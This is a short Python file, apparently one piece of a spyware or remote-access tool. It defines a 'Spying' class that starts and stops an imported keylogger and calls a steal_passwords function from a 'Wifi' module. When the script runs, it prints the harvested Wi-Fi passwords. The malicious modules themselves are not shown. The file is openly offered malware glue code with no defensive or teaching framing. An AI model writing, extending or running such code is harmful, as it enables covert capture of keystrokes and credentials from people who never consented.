from KeyLogger import KeyLogger
from Wifi import steal_passwords


class Spying:
    def __init__(self):
        self.keyLogger = None

    @staticmethod
    def steal_passwords():
        return steal_passwords()

    def start_keylogger(self):
        self.keyLogger = KeyLogger()
        self.keyLogger.start()

    def stop_keylogger(self):
        self.keyLogger.stop()


s = Spying()
print(steal_passwords())
